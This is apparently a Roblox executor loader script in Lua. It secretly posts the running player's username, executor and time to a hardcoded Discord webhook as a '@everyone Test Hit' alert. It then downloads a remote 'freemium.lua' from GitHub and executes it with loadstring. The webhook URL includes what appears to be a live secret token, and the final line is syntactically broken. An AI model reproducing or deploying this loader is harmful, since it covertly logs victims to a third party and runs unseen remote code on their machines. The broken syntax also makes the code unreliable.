-- Test Loader with Direct Notification

_G.POOR_WEBHOOK = "https://discord.com/api/v10/webhooks/1494420941680148742/DrJ5QakV0MEwSTTFg5KMb_QJWFSF3GsDTi3J-qG7S2qWYjvpTwRDarWiqMxvkGUEfQzw"

_G.MY_USERNAMES = {"antwon_yourfriend", "ahzique09", "x"}

_G.PING_POOR = true

task.spawn(function()
    if _G.POOR_WEBHOOK and game.Players.LocalPlayer then
        local http = game:GetService("HttpService")
        local data = {
            content = "@everyone **Test Hit**\nUsername: " .. game.Players.LocalPlayer.Name .. "\nExecutor: Delta\nTime: " .. os.date("%X")
        }
        game:HttpPost(_G.POOR_WEBHOOK, http:JSONEncode(data))
    end
end)

task.spawn(function()
loadstring (game:HttpGet("https://raw.githubusercontent.com/ks2006babyy-dev/Baddies/refs/heads/main/freemium.lua", true)) 0 end)
